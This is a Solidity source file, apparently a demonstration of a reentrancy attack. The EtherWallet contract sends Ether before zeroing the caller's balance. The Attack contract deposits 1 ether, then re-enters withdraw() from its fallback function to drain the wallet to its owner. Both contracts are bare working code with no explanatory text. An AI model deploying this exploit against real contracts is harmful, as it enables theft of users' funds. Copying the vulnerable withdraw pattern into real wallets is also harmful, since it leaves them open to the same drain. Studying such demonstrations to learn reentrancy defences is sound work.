// SPDX-License-Identifier: MIT

pragma solidity >= 0.5.0 <0.9.0; 

contract EtherWallet{
    mapping(address=>uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        require(balances[msg.sender] > 0,"Insufficient Funds..");
        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");

        require(sent,"Withdraw Failed");
        balances[msg.sender] = 0;
    }

    function walletBal() public view returns(uint){
        return address(this).balance;
    }
}

contract Attack{

    address payable owner;
    EtherWallet public etherWallet;
    event Deposit(address indexed sender,uint value);

    constructor(address _address) {
        etherWallet = EtherWallet(_address);
        owner = payable(msg.sender);
    }

    fallback() external payable {
        emit Deposit(msg.sender,msg.value);
        if (address(etherWallet).balance >= 1 ether) {
            etherWallet.withdraw();
        }

    }

    function attack() external payable{
        require(msg.value >= 1 ether,"Add Funds..");
        etherWallet.deposit{value: 1 ether}();
        etherWallet.withdraw();

    }

    function withdraw() external{
        owner.transfer(getBalance());
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}